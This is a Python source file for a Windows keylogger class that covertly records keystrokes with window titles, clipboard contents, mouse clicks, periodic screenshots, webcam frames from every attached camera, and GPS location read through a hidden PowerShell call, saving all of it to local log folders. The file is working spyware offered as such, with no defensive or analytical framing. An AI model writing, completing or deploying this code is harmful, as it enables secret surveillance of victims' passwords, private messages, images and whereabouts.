#note: if run good -> add try except read_camera
import os
import cv2
import time
import shutil
import keyboard
import threading
import pyautogui
import subprocess
import win32clipboard
import numpy as np
from pynput import keyboard, mouse
from datetime import datetime
from win32gui import GetWindowText, GetForegroundWindow


class Keylogger(object):    
    def __init__(self,\
             reset=False, log_output='log', camera_output='camera', screenshot_output='screenshot',\
             read_screenshot_interval=300, read_camera_interval=300):
        self.log_output = log_output
        self.log_filename = os.path.join(self.log_output, str(datetime.now().strftime("%Y%m%d"))+'.txt')
        self.camera_output = camera_output
        self.screenshot_output = screenshot_output

        #time between 2 capture
        self.read_window_interval = 0.2
        self.read_clipboard_interval = 0.2
        self.read_gps_interval = 300
        self.read_screenshot_interval = read_screenshot_interval
        self.read_camera_interval = read_camera_interval

        #timer to check
        self.t_window = 0
        self.t_keyboard = 0
        self.t_clipboard = 0
        self.t_gps = 0
        self.t_screenshot = 0
        self.t_camera = 0

        self.mouse_clicked = False
        self.seq = ''
        self.cam_list = []
        self.prev_window = ''
        self.prev_clipboard = ''
        
        self.COMBINATIONS = [
            {keyboard.Key.shift_l, keyboard.Key.ctrl_l, keyboard.Key.cmd}
        ]
        self.current = set()

        #remove all folder is reset is True
        if reset:
            self.clear_log()
        
        self.cam_list = self.get_camera_list()

    def clear_log(self, clear_all=False):
        if os.path.isdir(self.camera_output):
            shutil.rmtree(self.camera_output)
        if os.path.isdir(self.screenshot_output):
            shutil.rmtree(self.screenshot_output)
        if os.path.isdir(self.log_output):
            shutil.rmtree(self.log_output)

        
    def run(self, keyboard=True, clipboard=True, screenshot=True, camera=True, gps=True):
        if keyboard:
            self.read_mouse()
            self.read_keyboard()
        if gps:
            if not self.read_gps(init=True):
                gps = False
        while True:
            if time.time() - self.t_clipboard >= self.read_clipboard_interval and clipboard: #clipboard
                self.t_clipboard = time.time()
                clipboard = self.read_clipboard()
                if clipboard != '':
                    self.write_log_file('[CLIPBOARD]:\n' + str(clipboard) + '\n------------------------------------\n') #save to file

            if time.time() - self.t_gps >= self.read_gps_interval and gps: #GPS
                self.t_gps = time.time()
                self.read_gps()
            if time.time() - self.t_screenshot >= self.read_screenshot_interval and screenshot: #screenshot
                self.t_screenshot = time.time()
                self.read_screenshot()
            if time.time() - self.t_camera >= self.read_camera_interval and camera: #camera
                self.t_camera = time.time()
                self.read_camera()
                
            time.sleep(min(self.read_window_interval, self.read_window_interval,\
                           self.read_clipboard_interval, self.read_screenshot_interval, self.read_camera_interval)) #delay before other capture

    def get_camera_list(self): #capture camera from all available cams (10 cams, from 0-9)
        cam_list = []
        min_index = 0
        max_index = 10
        for i in range(min_index, max_index):
            try:
                cap = cv2.VideoCapture(i)
                if cap.read()[0]:
                    cam_list.append(i)
                    cap.release()
            except:
                pass
        return cam_list
    
    def read_gps(self, init=False):
        try:
            pshellcomm = ['powershell']
            pshellcomm.append('Add-Type -AssemblyName System.Device;'\
                              '$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher;'\
                              '$GeoWatcher.Start();'\
                              'while (($GeoWatcher.Status -ne "Ready") -and ($GeoWatcher.Permission -ne "Denied"))'\
                              '{Start-Sleep -Milliseconds};'\
                              'if ($GeoWatcher.Permission -eq "Denied")'\
                              '{Write-Error "Access Denied for Location Information"}'\
                              'else'\
                              '{$GeoWatcher.Position.Location}')
            output, err = subprocess.Popen(pshellcomm,
                                           stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                           text=True, creationflags=0x08000000).communicate()
            output = output.split('\n')
            output = output[::-1] #result are more likely to be at the end of the output, flip output to shorten runtime
            #print(output)
            lat, lon = 0, 0
            for line in output:
                line = line.replace('\n', '')
                if line == '':
                    continue
                if 'Latitude' in line:
                    lat = float(line[line.find(': ')+2:])
                if 'Longitude' in line:
                    lon = float(line[line.find(': ')+2:])
                if lat != 0 and lon != 0:
                    self.write_log_file('\n------------------------------------\n[LAT:' + str(lat) + ' | LON:' + str(lon) +']:\n') #save to file
                    break
            if init:
                return True
        except Exception as e:
            print(e)
            if init:
                return False
            
    def read_screenshot(self):
        try:
            #pyautogui does not capture mouse
            img = pyautogui.screenshot() #capture screenshot
            img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            (x,y) = pyautogui.position() #get mouse pos
            mouse_pos = img.copy() #copy to draw mouse position
            mouse_pos = cv2.circle(mouse_pos, (x,y), 11, (0,0,0), 3) #draw mouse position
            mouse_pos = cv2.circle(mouse_pos, (x,y), 10, (0,255,0), -1) #draw mouse position
            img = cv2.addWeighted(mouse_pos, 0.5, img, 0.5, 0) #show mouse position but a little bit fade
            if not os.path.isdir(self.screenshot_output):
                os.mkdir(self.screenshot_output)
            if not os.path.isdir(os.path.join(self.screenshot_output, str(datetime.now().strftime("%Y%m%d")))):
                os.mkdir(os.path.join(self.screenshot_output, str(datetime.now().strftime("%Y%m%d"))))
            cv2.imwrite(os.path.join(self.screenshot_output, str(datetime.now().strftime("%Y%m%d")),\
                                     str(datetime.now().strftime("%Y%m%d%H%M%S"))+'.jpg'), img)
        except:
            pass
        
    def read_camera(self):
        for i in self.cam_list: #read all cameras
            try:
                cap = cv2.VideoCapture(i)
                ret, img = cap.read()
                cap.release()
                if not ret:
                    continue
                if not os.path.isdir(self.camera_output):
                    os.mkdir(self.camera_output)
                if not os.path.isdir(os.path.join(self.camera_output, str(datetime.now().strftime("%Y%m%d")))):
                    os.mkdir(os.path.join(self.camera_output, str(datetime.now().strftime("%Y%m%d"))))
                cv2.imwrite(os.path.join(self.camera_output, str(datetime.now().strftime("%Y%m%d")),\
                                         str(datetime.now().strftime("%Y%m%d%H%M%S"))+'_'+str(i)+'.jpg'), img)
            except:
                pass
        
    def read_clipboard(self):
        #if can read Ctrl + C then read clipboard after detect Ctrl + C
        clipboard = ''
        while clipboard == '': #capture clipboard if being blocked by different apps
            try:
                win32clipboard.OpenClipboard()
                clipboard = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
            except:
                time.sleep(.05)
        #remove this if can detect Ctrl + C
        if clipboard != self.prev_clipboard: #if different then return data, else return empty string
            self.prev_clipboard = clipboard
            return clipboard
        else:
            return ''

    def read_keyboard(self):
        def on_press(key):
            if any([key in COMBO for COMBO in self.COMBINATIONS]):
                self.current.add(key)
                if any(all(k in self.current for k in COMBO) for COMBO in self.COMBINATIONS):
                    #open GUI
                    pass
            try:
                c = str(key.char)
            except AttributeError:
                c = str(key).replace('Key.', '')
                if c == 'space':
                    c = ' '
                else:
                    c = '[' + str(c) + ']'

            current_window = GetWindowText(GetForegroundWindow())
            if current_window != self.prev_window:
                self.write_log_file('\n------------------------------------\n[' + str(current_window) + ']:\n') #save to file
                self.prev_window = current_window
            
            self.mouse_clicked = False
            self.write_log_file(str(c)) #save to file
        def on_release(key):
            try:
                self.current.remove(key)
            except:
                pass
            
        keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        keyboard_listener.start()

    def read_mouse(self):
        def on_click(x, y, button, pressed):
            if pressed and not self.mouse_clicked:
                self.write_log_file('\n') #save to file
                self.mouse_clicked = True

        mouse_listener = mouse.Listener(on_click=on_click)
        mouse_listener.start()

    def write_log_file(self, text):
        if not os.path.isdir(self.log_output):
            os.mkdir(self.log_output)
        f = open(self.log_filename, 'a+', encoding='utf-8')
        f.write(str(text))
        f.close()

def run():
    pass
    #read config from file and run Keylogger()   

